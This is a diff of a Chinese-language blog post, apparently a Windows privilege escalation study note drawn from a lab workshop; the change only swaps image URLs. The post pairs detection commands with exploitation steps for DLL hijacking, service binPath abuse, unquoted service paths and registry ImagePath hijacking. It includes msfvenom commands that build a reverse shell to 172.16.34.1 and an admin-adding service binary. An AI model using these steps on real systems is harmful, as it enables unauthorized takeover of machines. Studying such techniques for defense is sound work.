@@ -189,12 +189,12 @@ Detection (Get HotFix information)powershell">
             <!-- Post Main Content -->
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                 <p>之前看到這篇教材解得很棒<br>source: <a target="_blank" rel="noopener" href="https://github.com/sagishahar/lpeworkshop">https://github.com/sagishahar/lpeworkshop</a></p>
-<h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><p><img src="https://i.imgur.com/s1EHW0N.png" alt=""></p>
+<h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><p><img src="/img/2020/privilege-escalation-note/s1EHW0N.png" alt=""></p>
 <p>有這些層面，一項一項來說明</p>
 <h2 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h2><p>比較常見的就是利用 <code>windows-kernel-exploits</code> 取得相關cve來打</p>
 <p>但經實測可能會顯示不完全，因此還是建議去exploitdb找看看</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
-<h3 id="Detection-Get-HotFix-information"><a href="#Detection-Get-HotFix-information" class="headerlink" title="Detection (Get HotFix information)"></a>Detection (Get HotFix information)</h3><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><p>Get-HotFix<br><img src="https://i.imgur.com/O1PDOY4.png" alt=""></p>
+<h3 id="Detection-Get-HotFix-information"><a href="#Detection-Get-HotFix-information" class="headerlink" title="Detection (Get HotFix information)"></a>Detection (Get HotFix information)</h3><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><p>Get-HotFix<br><img src="/img/2020/privilege-escalation-note/O1PDOY4.png" alt=""></p>
 <h4 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h4><p>systeminfo<br>wmic qfe list full</p>
 <p>windows-privesc-check2.exe –audit -T auto -o report</p>
 <p>Download Link:<a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/windows-privesc-check">https://github.com/pentestmonkey/windows-privesc-check</a></p>
@@ -228,75 +228,75 @@ Detection (Get HotFix information)powershell">
 <p><a target="_blank" rel="noopener" href="https://support.microsoft.com/zh-tw/help/2264107/a-new-cwdillegalindllsearch-registry-entry-is-available-to-control-the">https://support.microsoft.com/zh-tw/help/2264107/a-new-cwdillegalindllsearch-registry-entry-is-available-to-control-the</a></p>
 <h4 id="Detection"><a href="#Detection" class="headerlink" title="Detection"></a>Detection</h4><h5 id="Static-Linking"><a href="#Static-Linking" class="headerlink" title="Static Linking"></a>Static Linking</h5><p><code>Dependency Walker</code> (Can’t detect create dll)<br><a target="_blank" rel="noopener" href="https://www.dependencywalker.com/">https://www.dependencywalker.com/</a><br><a target="_blank" rel="noopener" href="https://mitblog.pixnet.net/blog/post/37300664">https://mitblog.pixnet.net/blog/post/37300664</a></p>
 <p><code>Dumpbin</code>(此工具只能從 visual studio獲得)<br><code>dumpbin.exe /DEPENDENTS &lt;exec file&gt;</code></p>
-<p><img src="https://i.imgur.com/vBLdj2R.png" alt=""></p>
-<h5 id="Dynamic-Linking"><a href="#Dynamic-Linking" class="headerlink" title="Dynamic Linking"></a>Dynamic Linking</h5><p><code>Rattler</code> (Can’t detect create dll)<br><a target="_blank" rel="noopener" href="https://github.com/sensepost/rattler/releases">https://github.com/sensepost/rattler/releases</a><br><img src="https://i.imgur.com/CteolRJ.png" alt=""></p>
-<p><code>Process Monitor(Sysinternals)</code> (recommand)<br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">https://docs.microsoft.com/en-us/sysinternals/downloads/procmon</a><br><img src="https://i.imgur.com/zGHRDrG.png" alt=""><br>Dependz can help to analyze <code>Process monitor log file</code><br><a target="_blank" rel="noopener" href="https://github.com/blinemedical/Dependz">https://github.com/blinemedical/Dependz</a></p>
-<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p>check service permission<br><img src="https://i.imgur.com/Qwtnx5d.png" alt=""></p>
-<p>check service binary permission<br><img src="https://i.imgur.com/1fJRrhB.png" alt=""><br>We can copy the binary to somewhere.<br><img src="https://i.imgur.com/T0RemP7.png" alt=""><br>Transfer the binary to my localhost<br><img src="https://i.imgur.com/pUkOvVc.png" alt=""></p>
-<p><img src="https://i.imgur.com/6YWJWwA.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/vBLdj2R.png" alt=""></p>
+<h5 id="Dynamic-Linking"><a href="#Dynamic-Linking" class="headerlink" title="Dynamic Linking"></a>Dynamic Linking</h5><p><code>Rattler</code> (Can’t detect create dll)<br><a target="_blank" rel="noopener" href="https://github.com/sensepost/rattler/releases">https://github.com/sensepost/rattler/releases</a><br><img src="/img/2020/privilege-escalation-note/CteolRJ.png" alt=""></p>
+<p><code>Process Monitor(Sysinternals)</code> (recommand)<br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">https://docs.microsoft.com/en-us/sysinternals/downloads/procmon</a><br><img src="/img/2020/privilege-escalation-note/zGHRDrG.png" alt=""><br>Dependz can help to analyze <code>Process monitor log file</code><br><a target="_blank" rel="noopener" href="https://github.com/blinemedical/Dependz">https://github.com/blinemedical/Dependz</a></p>
+<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p>check service permission<br><img src="/img/2020/privilege-escalation-note/Qwtnx5d.png" alt=""></p>
+<p>check service binary permission<br><img src="/img/2020/privilege-escalation-note/1fJRrhB.png" alt=""><br>We can copy the binary to somewhere.<br><img src="/img/2020/privilege-escalation-note/T0RemP7.png" alt=""><br>Transfer the binary to my localhost<br><img src="/img/2020/privilege-escalation-note/pUkOvVc.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/6YWJWwA.png" alt=""></p>
 <p>Create a service<br><code>sc create dllsvc2 binpath= &quot;C:\User\IEUuser\Desktop\dllhijackservice.exe&quot; type= own</code></p>
-<p><img src="https://i.imgur.com/dSr53DN.png" alt=""><br>Run “Process Monitor” as admin<br>Set filter(Ctrl+l)<br>Process name is <code>dllhijackservice.exe</code><br>Result is <code>NAME NOT FOUND</code><br><img src="https://i.imgur.com/oaO9ASo.png" alt=""></p>
-<p>and apply the setting.<br><code>sc start dllsvc2</code><br><img src="https://i.imgur.com/5iA2BdD.jpg" alt=""></p>
-<p>Will find that missing DLL file.<br>Now return to vuln host.<br>check the <code>Path</code> in env<br><img src="https://i.imgur.com/BECseuW.png" alt=""></p>
-<p>create backdoor<br><img src="https://i.imgur.com/oUQDW7J.png" alt=""></p>
-<p>put the backdoor to env path<br><img src="https://i.imgur.com/pDKTIIq.png" alt=""></p>
-<p><code>sc start dllsvc</code> (好像是payload問題，彈不出shell)<br><img src="https://i.imgur.com/2rIf8i3.png" alt=""></p>
-<h3 id="binPath"><a href="#binPath" class="headerlink" title="binPath"></a>binPath</h3><p><img src="https://i.imgur.com/ZX6XnwQ.png" alt=""></p>
-<p><img src="https://i.imgur.com/DnIMymb.png" alt=""></p>
-<h4 id="Detection-1"><a href="#Detection-1" class="headerlink" title="Detection"></a>Detection</h4><h5 id="Service-Controller-cmd"><a href="#Service-Controller-cmd" class="headerlink" title="Service Controller(cmd)"></a>Service Controller(cmd)</h5><p><code>sc sdshow &lt;service name&gt;</code><br><img src="https://i.imgur.com/eq5RvEK.png" alt=""></p>
-<p><code>SDDL</code><br><img src="https://i.imgur.com/9wz0fIO.png" alt=""></p>
-<p><img src="https://i.imgur.com/mOMZo80.png" alt=""></p>
-<h5 id="accesschk"><a href="#accesschk" class="headerlink" title="accesschk"></a>accesschk</h5><p><code>accesschk.exe /accepteula -uvwcq &lt;service name&gt;</code><br><img src="https://i.imgur.com/jYGDEz4.png" alt=""></p>
-<p><code>accesschk.exe /accepteula -uvwcq &lt;username&gt; *</code><br><img src="https://i.imgur.com/DbXr2Pg.png" alt=""></p>
-<h5 id="Powershell-PowerUp"><a href="#Powershell-PowerUp" class="headerlink" title="Powershell(PowerUp)"></a>Powershell(PowerUp)</h5><p><code>Get-ModifiableService</code><br><img src="https://i.imgur.com/hda5eP4.png" alt=""></p>
-<p>Use <code>Test-ServiceDaclPermission &lt;service name&gt;</code> to check status<br><img src="https://i.imgur.com/nCRXGSn.png" alt=""></p>
-<h4 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h4><h5 id="Service-Controller"><a href="#Service-Controller" class="headerlink" title="Service Controller"></a>Service Controller</h5><p><code>check service detail information</code><br><code>sc qc &lt;service name&gt;</code><br><img src="https://i.imgur.com/WkVumab.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/dSr53DN.png" alt=""><br>Run “Process Monitor” as admin<br>Set filter(Ctrl+l)<br>Process name is <code>dllhijackservice.exe</code><br>Result is <code>NAME NOT FOUND</code><br><img src="/img/2020/privilege-escalation-note/oaO9ASo.png" alt=""></p>
+<p>and apply the setting.<br><code>sc start dllsvc2</code><br><img src="/img/2020/privilege-escalation-note/5iA2BdD.jpg" alt=""></p>
+<p>Will find that missing DLL file.<br>Now return to vuln host.<br>check the <code>Path</code> in env<br><img src="/img/2020/privilege-escalation-note/BECseuW.png" alt=""></p>
+<p>create backdoor<br><img src="/img/2020/privilege-escalation-note/oUQDW7J.png" alt=""></p>
+<p>put the backdoor to env path<br><img src="/img/2020/privilege-escalation-note/pDKTIIq.png" alt=""></p>
+<p><code>sc start dllsvc</code> (好像是payload問題，彈不出shell)<br><img src="/img/2020/privilege-escalation-note/2rIf8i3.png" alt=""></p>
+<h3 id="binPath"><a href="#binPath" class="headerlink" title="binPath"></a>binPath</h3><p><img src="/img/2020/privilege-escalation-note/ZX6XnwQ.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/DnIMymb.png" alt=""></p>
+<h4 id="Detection-1"><a href="#Detection-1" class="headerlink" title="Detection"></a>Detection</h4><h5 id="Service-Controller-cmd"><a href="#Service-Controller-cmd" class="headerlink" title="Service Controller(cmd)"></a>Service Controller(cmd)</h5><p><code>sc sdshow &lt;service name&gt;</code><br><img src="/img/2020/privilege-escalation-note/eq5RvEK.png" alt=""></p>
+<p><code>SDDL</code><br><img src="/img/2020/privilege-escalation-note/9wz0fIO.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/mOMZo80.png" alt=""></p>
+<h5 id="accesschk"><a href="#accesschk" class="headerlink" title="accesschk"></a>accesschk</h5><p><code>accesschk.exe /accepteula -uvwcq &lt;service name&gt;</code><br><img src="/img/2020/privilege-escalation-note/jYGDEz4.png" alt=""></p>
+<p><code>accesschk.exe /accepteula -uvwcq &lt;username&gt; *</code><br><img src="/img/2020/privilege-escalation-note/DbXr2Pg.png" alt=""></p>
+<h5 id="Powershell-PowerUp"><a href="#Powershell-PowerUp" class="headerlink" title="Powershell(PowerUp)"></a>Powershell(PowerUp)</h5><p><code>Get-ModifiableService</code><br><img src="/img/2020/privilege-escalation-note/hda5eP4.png" alt=""></p>
+<p>Use <code>Test-ServiceDaclPermission &lt;service name&gt;</code> to check status<br><img src="/img/2020/privilege-escalation-note/nCRXGSn.png" alt=""></p>
+<h4 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h4><h5 id="Service-Controller"><a href="#Service-Controller" class="headerlink" title="Service Controller"></a>Service Controller</h5><p><code>check service detail information</code><br><code>sc qc &lt;service name&gt;</code><br><img src="/img/2020/privilege-escalation-note/WkVumab.png" alt=""></p>
 <p><code>sc config &lt;service name&gt; binpath= &quot;&lt;command or exe file&gt;&quot;</code> (空格有差)</p>
-<p><img src="https://i.imgur.com/RSfKRbS.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/RSfKRbS.png" alt=""></p>
 <p><code>sc config &lt;service name&gt; obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</code></p>
 <p>為了拿到最高權限，必需設定為<code>LocalSystem</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Local System</span><br><span class="line">在本機具備最高權限（使用時務必小心），與BUILTIN\Administrators具備相同權限，可存取本機大部分資源，與遠端主機溝通時則使用該主機電腦帳號（&lt;domain_name&gt;\&lt;computer_name&gt;$） 。做為授權對象時，LocalSystem帳號可寫成NT AUTHORITY\SYSTEM、LocalSystem、&lt;computer name&gt;\LocalSystem。執行時期將使用預設使用者機碼(HKET_USERS\.DEFAULT)。</span><br><span class="line"></span><br><span class="line">Local Service</span><br><span class="line">在本機的權限相當於Users群組，目的在減小服務或程序遭入侵的損害範圍，存取遠端資源時使用匿名身分。做為授權對象時，Local Service可寫成NT AUTHORITY\LOCAL SERVICE。Local Service有自已的HKEY_USERS機碼（HKEY_USERS\S-1-5-19）</span><br><span class="line"></span><br><span class="line">Network Service</span><br><span class="line">在本機的權限相當於Users群組，旨在控制服務程序遭惡意操控時的損害範圍，對外存取遠端資源時使用該主機電腦帳號（&lt;domain_name&gt;\&lt;computer_name&gt;$）。做為授權對象時，Network Service帳號可寫成NT AUTHORITY\NETWORK SERVICE 。Network Service也有自已的HKEY_USERS機碼（HKEY_USERS\S-1-5-20）</span><br></pre></td></tr></table></figure><br>ref: <a target="_blank" rel="noopener" href="https://blog.darkthread.net/blog/local-system-local-service-network-service/">https://blog.darkthread.net/blog/local-system-local-service-network-service/</a></p>
-<p><img src="https://i.imgur.com/OXpOj1b.png" alt=""></p>
-<p>開啟服務:<br><code>sc config &lt;service name&gt; start= &quot;demand&quot;</code><br><img src="https://i.imgur.com/zzmGzmb.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/OXpOj1b.png" alt=""></p>
+<p>開啟服務:<br><code>sc config &lt;service name&gt; start= &quot;demand&quot;</code><br><img src="/img/2020/privilege-escalation-note/zzmGzmb.png" alt=""></p>
 <p>關閉服務:<br><code>sc config &lt;service name&gt; start= disabled</code></p>
 <p>開啟網路服務</p>
-<p><code>net start &lt;service name&gt;</code><br><img src="https://i.imgur.com/RhAgnVv.png" alt=""></p>
-<p><img src="https://i.imgur.com/kJOWwm7.png" alt=""></p>
+<p><code>net start &lt;service name&gt;</code><br><img src="/img/2020/privilege-escalation-note/RhAgnVv.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/kJOWwm7.png" alt=""></p>
 <h5 id="Metasploit-1"><a href="#Metasploit-1" class="headerlink" title="Metasploit"></a>Metasploit</h5><p><code>exploit/windows/local/service_permissions</code><br><a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/windows/local/service_permissions">https://www.rapid7.com/db/modules/exploit/windows/local/service_permissions</a></p>
-<h5 id="Powershell-PowerUp-1"><a href="#Powershell-PowerUp-1" class="headerlink" title="Powershell (PowerUp)"></a>Powershell (PowerUp)</h5><p><code>Invoke-ServiceAbuse -Name &lt;service name&gt; -Command &lt;command or exe file&gt;</code><br><img src="https://i.imgur.com/s6FK5QR.png" alt=""></p>
+<h5 id="Powershell-PowerUp-1"><a href="#Powershell-PowerUp-1" class="headerlink" title="Powershell (PowerUp)"></a>Powershell (PowerUp)</h5><p><code>Invoke-ServiceAbuse -Name &lt;service name&gt; -Command &lt;command or exe file&gt;</code><br><img src="/img/2020/privilege-escalation-note/s6FK5QR.png" alt=""></p>
 <h5 id="cmd-1"><a href="#cmd-1" class="headerlink" title="cmd"></a>cmd</h5><p><code>powershell.exe -ExecutionPolicy UnRestricted &quot;. .\PowerUp.ps1; Invoke-ServiceAbuse -Name &lt;service name&gt; -Command &lt;command or exe file&gt;&quot;</code></p>
 <h3 id="Unquoted-Path"><a href="#Unquoted-Path" class="headerlink" title="Unquoted Path"></a>Unquoted Path</h3><p>如果你用到含有空白的路徑時，最好用雙引號將左右兩側包好，<br>避免駭客因使用曖昧不明的檔名進行攻擊<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If you are using a long file name that contains a space, use quoted strings to indicate where the file name ends and the arguments begin; otherwise, the file name is ambiguous.</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">For example, consider the string </span><br><span class="line">&quot;c:\program files\sub dir\program name&quot;. </span><br><span class="line">This string can be interpreted in a number of ways. The system tries to interpret the possibilities in the following order:</span><br><span class="line"></span><br><span class="line">c:\program.exe </span><br><span class="line">c:\program files\sub.exe </span><br><span class="line">c:\program files\sub dir\program.exe </span><br><span class="line">c:\program files\sub dir\program name.exe </span><br><span class="line"></span><br><span class="line">If the executable module is a 16-bit application, lpApplicationName should be NULL, and the string pointed to by lpCommandLine should specify the executable module as well as its arguments.</span><br></pre></td></tr></table></figure><br>ref:<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa?redirectedfrom=MSDN</a></p>
-<p><img src="https://i.imgur.com/2vGVyFQ.png" alt=""></p>
-<h4 id="Detection-2"><a href="#Detection-2" class="headerlink" title="Detection"></a>Detection</h4><h5 id="cmd-wmic"><a href="#cmd-wmic" class="headerlink" title="cmd(wmic)"></a>cmd(wmic)</h5><p>wmic service get name,pathname,startmode,startname | findstr /i localsystem<br><img src="https://i.imgur.com/25va9vc.png" alt=""></p>
-<h5 id="powershell-wmi"><a href="#powershell-wmi" class="headerlink" title="powershell(wmi)"></a>powershell(wmi)</h5><p>Get-WmiObject win32_service | select Name,PathName,StartMode,StartName | where {$_.StartName -eq “LocalSystem”}<br><img src="https://i.imgur.com/QKYcv4b.png" alt=""></p>
-<h5 id="Powershell-PowerUp-2"><a href="#Powershell-PowerUp-2" class="headerlink" title="Powershell(PowerUp)"></a>Powershell(PowerUp)</h5><p>Get-ServiceUnquoted<br><img src="https://i.imgur.com/kOA9osc.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/2vGVyFQ.png" alt=""></p>
+<h4 id="Detection-2"><a href="#Detection-2" class="headerlink" title="Detection"></a>Detection</h4><h5 id="cmd-wmic"><a href="#cmd-wmic" class="headerlink" title="cmd(wmic)"></a>cmd(wmic)</h5><p>wmic service get name,pathname,startmode,startname | findstr /i localsystem<br><img src="/img/2020/privilege-escalation-note/25va9vc.png" alt=""></p>
+<h5 id="powershell-wmi"><a href="#powershell-wmi" class="headerlink" title="powershell(wmi)"></a>powershell(wmi)</h5><p>Get-WmiObject win32_service | select Name,PathName,StartMode,StartName | where {$_.StartName -eq “LocalSystem”}<br><img src="/img/2020/privilege-escalation-note/QKYcv4b.png" alt=""></p>
+<h5 id="Powershell-PowerUp-2"><a href="#Powershell-PowerUp-2" class="headerlink" title="Powershell(PowerUp)"></a>Powershell(PowerUp)</h5><p>Get-ServiceUnquoted<br><img src="/img/2020/privilege-escalation-note/kOA9osc.png" alt=""></p>
 <h5 id="cmd-2"><a href="#cmd-2" class="headerlink" title="cmd"></a>cmd</h5><p>powershell.exe -ExecutionPolicy UnRestricted “. .\PowerUp.ps1; Get-ServiceUnquoted”</p>
-<p><img src="https://i.imgur.com/nsQudrh.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/nsQudrh.png" alt=""></p>
 <h4 id="Exploitation-2"><a href="#Exploitation-2" class="headerlink" title="Exploitation"></a>Exploitation</h4><h5 id="Manual"><a href="#Manual" class="headerlink" title="Manual"></a>Manual</h5><ol>
 <li>Check the permissions of the service</li>
 </ol>
 <p><code>accesschk.exe /accepteula &quot;&lt;Path&gt;&quot;</code></p>
-<p><code>accesschk.exe /accepteula &quot;C:\Program Files&quot;</code><br><img src="https://i.imgur.com/WTWGAkt.png" alt=""></p>
-<p><img src="https://i.imgur.com/ZJ7NMi8.png" alt=""></p>
+<p><code>accesschk.exe /accepteula &quot;C:\Program Files&quot;</code><br><img src="/img/2020/privilege-escalation-note/WTWGAkt.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/ZJ7NMi8.png" alt=""></p>
 <p><code>accesschk.exe /accepteula -uv user &quot;C:\Program Files&quot;</code></p>
-<p><img src="https://i.imgur.com/S2R0ee5.png" alt=""></p>
-<p><img src="https://i.imgur.com/UvgwxIq.png" alt=""></p>
-<p>check user permissions<br><img src="https://i.imgur.com/lzvRD5B.png" alt=""></p>
-<p><img src="https://i.imgur.com/VCnIv8y.png" alt=""></p>
-<p><img src="https://i.imgur.com/yLIV72v.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/S2R0ee5.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/UvgwxIq.png" alt=""></p>
+<p>check user permissions<br><img src="/img/2020/privilege-escalation-note/lzvRD5B.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/VCnIv8y.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/yLIV72v.png" alt=""></p>
 <ol start="2">
 <li><p>Create a custom binary<br><code>msfvenom -p windows/shell_reverse_tcp LHOST=172.16.34.1 LPORT=443 -a x86 -f exe -o Common.exe</code><br>or<br><code>msfvenom -p windows/exec CMD=&#39;net localgroup administrators user /add&#39; -f exe-service -o Common.exe</code></p>
 </li>
-<li><p>Put the binary in unquoted path like <code>C:\Program Files\Unquoted Path Service</code><br><img src="https://i.imgur.com/ZPjNdkh.png" alt=""></p>
+<li><p>Put the binary in unquoted path like <code>C:\Program Files\Unquoted Path Service</code><br><img src="/img/2020/privilege-escalation-note/ZPjNdkh.png" alt=""></p>
 </li>
 </ol>
 <ol start="4">
-<li>Start the service<br><code>sc start unquotedsvc</code><br><img src="https://i.imgur.com/C9HnY9E.png" alt=""><br>the same as reverse shell<br><img src="https://i.imgur.com/gWwmcsS.png" alt=""></li>
+<li>Start the service<br><code>sc start unquotedsvc</code><br><img src="/img/2020/privilege-escalation-note/C9HnY9E.png" alt=""><br>the same as reverse shell<br><img src="/img/2020/privilege-escalation-note/gWwmcsS.png" alt=""></li>
 </ol>
 <h5 id="Metasploit-2"><a href="#Metasploit-2" class="headerlink" title="Metasploit"></a>Metasploit</h5><p><code>exploit/windows/local/trusted_service_path</code><br><a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/windows/local/trusted_service_path">https://www.rapid7.com/db/modules/exploit/windows/local/trusted_service_path</a></p>
 <h5 id="Powershell-Powerup"><a href="#Powershell-Powerup" class="headerlink" title="Powershell(Powerup)"></a>Powershell(Powerup)</h5><p><code>Write-ServiceBinary -Name &lt;service name&gt; -Path &lt;hijack path&gt;</code></p>
 <h3 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">The registry is a hierarchical database that contains data that is critical for the operation of Windows and the applications and services that run on Windows.</span><br><span class="line">The data is structured in a tree format.</span><br><span class="line">Each node in the tree is called a key.</span><br><span class="line">Each key can contain both subkeys and data entries called values.</span><br></pre></td></tr></table></figure>
 <p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/sysinfo/structure-of-the-registry">https://docs.microsoft.com/en-us/windows/win32/sysinfo/structure-of-the-registry</a></p>
-<p><img src="https://i.imgur.com/Ey1KTRf.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/Ey1KTRf.png" alt=""></p>
 <h4 id="Detection-3"><a href="#Detection-3" class="headerlink" title="Detection"></a>Detection</h4><h5 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h5><p>請注意 <code>:</code> 和 <code>\</code> </p>
 <p>Get-Acl -Path hklm:\System\CurrentControlSet\services* | select Path,AccessToString | Format-List</p>
 <p>Get-Acl -Path hklm:\System\CurrentControlSet\services* | fl<br><code>(fl = format-list)</code></p>
@@ -307,62 +307,62 @@ Detection (Get HotFix information)powershell">
 <p><code>reg query HKLM\System\CurrentControlSet\services\&lt;service name&gt;</code></p>
 <h5 id="accesschk-1"><a href="#accesschk-1" class="headerlink" title="accesschk"></a>accesschk</h5><p>accesschk64.exe /accepteula -kvusw hklm\System\CurrentControlSet\services &gt; res.txt</p>
 <p>accesschk64.exe  /accepteula -kuv hklm\System\CurrentControlSet\services &gt; res.txt</p>
-<h5 id="AccessEnum-UI-Sysinternel"><a href="#AccessEnum-UI-Sysinternel" class="headerlink" title="AccessEnum (UI)(Sysinternel)"></a>AccessEnum (UI)(Sysinternel)</h5><p><img src="https://i.imgur.com/WNkqAEY.png" alt=""></p>
-<p><img src="https://i.imgur.com/eGCx4se.png" alt=""></p>
-<h4 id="Exploitation-3"><a href="#Exploitation-3" class="headerlink" title="Exploitation"></a>Exploitation</h4><p>check service permission of <code>regsvc</code><br><img src="https://i.imgur.com/IMSmOS7.png" alt=""></p>
-<p>check group of <code>user</code><br><img src="https://i.imgur.com/pfCgCQb.png" alt=""></p>
-<p>check registry permission of <code>regsvc</code><br><img src="https://i.imgur.com/8tHWkBy.png" alt=""></p>
+<h5 id="AccessEnum-UI-Sysinternel"><a href="#AccessEnum-UI-Sysinternel" class="headerlink" title="AccessEnum (UI)(Sysinternel)"></a>AccessEnum (UI)(Sysinternel)</h5><p><img src="/img/2020/privilege-escalation-note/WNkqAEY.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/eGCx4se.png" alt=""></p>
+<h4 id="Exploitation-3"><a href="#Exploitation-3" class="headerlink" title="Exploitation"></a>Exploitation</h4><p>check service permission of <code>regsvc</code><br><img src="/img/2020/privilege-escalation-note/IMSmOS7.png" alt=""></p>
+<p>check group of <code>user</code><br><img src="/img/2020/privilege-escalation-note/pfCgCQb.png" alt=""></p>
+<p>check registry permission of <code>regsvc</code><br><img src="/img/2020/privilege-escalation-note/8tHWkBy.png" alt=""></p>
 <p>check registry key as <code>regsve</code> (powershell)</p>
-<p><code>powershell.exe -ExecutionPolicy UnRestricted &quot;Get-ItemProperty -Path HKLM:\System\CurrentControlSet\services\regsvc&quot;</code><br><img src="https://i.imgur.com/NO92RNP.png" alt=""></p>
-<p>check registry key as <code>regsve</code> (reg)<br><code>reg query HKLM:\System\CurrentControlSet\services\regsvc</code><br><img src="https://i.imgur.com/KsTt9Mj.png" alt=""></p>
+<p><code>powershell.exe -ExecutionPolicy UnRestricted &quot;Get-ItemProperty -Path HKLM:\System\CurrentControlSet\services\regsvc&quot;</code><br><img src="/img/2020/privilege-escalation-note/NO92RNP.png" alt=""></p>
+<p>check registry key as <code>regsve</code> (reg)<br><code>reg query HKLM:\System\CurrentControlSet\services\regsvc</code><br><img src="/img/2020/privilege-escalation-note/KsTt9Mj.png" alt=""></p>
 <ol>
 <li>put the reverseshell to tmp directory</li>
 </ol>
-<p><img src="https://i.imgur.com/jg8B2t9.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/jg8B2t9.png" alt=""></p>
 <ol start="2">
 <li>use <code>reg</code> or <code>powershell</code> to overwrite imagepath subkey of vuln service with the path as custom binary</li>
 </ol>
 <p><code>reg add hklm\System\CurrentControlSet\services\&lt;vuln service name&gt; /v  ImagePath /t REG_EXPAND_SZ -d &lt;path to exe&gt; /f</code></p>
-<p>ex.<code>reg add hklm\System\CurrentControlSet\services\regsvc /v  ImagePath /t REG_EXPAND_SZ /d C:\Temp\shell.exe /f</code><br><img src="https://i.imgur.com/tt3MYVL.png" alt=""></p>
+<p>ex.<code>reg add hklm\System\CurrentControlSet\services\regsvc /v  ImagePath /t REG_EXPAND_SZ /d C:\Temp\shell.exe /f</code><br><img src="/img/2020/privilege-escalation-note/tt3MYVL.png" alt=""></p>
 <p><code>New-ItemProperty -Path HKLM:\System\CurrentControlSet\services\&lt;service name&gt; -Name ImagePath -Value &#39;&lt;path to exe&gt;&#39; -PropertyType ExpandString -Force&quot;</code></p>
 <p>ex.<code>powershell.exe -ExecutionPolicy UnRestricted &quot;New-ItemProperty -Path HKLM:\System\CurrentControlSet\services\regsvc -Name ImagePath -Value &#39;C:\Temp\shell.exe&#39; -PropertyType ExpandString -Force&quot;</code></p>
-<p><img src="https://i.imgur.com/Fi6bGZp.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/Fi6bGZp.png" alt=""></p>
 <ol start="3">
 <li>finally start the <code>regsvc</code> service </li>
 </ol>
-<p><code>sc start regsvc</code><br><img src="https://i.imgur.com/Ac2LgMK.png" alt=""></p>
+<p><code>sc start regsvc</code><br><img src="/img/2020/privilege-escalation-note/Ac2LgMK.png" alt=""></p>
 <h3 id="Executable-File"><a href="#Executable-File" class="headerlink" title="Executable File"></a>Executable File</h3><h4 id="Detection-4"><a href="#Detection-4" class="headerlink" title="Detection"></a>Detection</h4><h5 id="icacls-cacls-太難了看不懂"><a href="#icacls-cacls-太難了看不懂" class="headerlink" title="icacls/cacls (太難了看不懂)"></a>icacls/cacls (太難了看不懂)</h5><p><code>cacls/icacls &lt;directory or file&gt;</code></p>
-<p><img src="https://i.imgur.com/LccLs4S.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/LccLs4S.png" alt=""></p>
 <h5 id="accesschk-2"><a href="#accesschk-2" class="headerlink" title="accesschk"></a>accesschk</h5><p><code>accesschk -wuv &lt;directory or file&gt;</code></p>
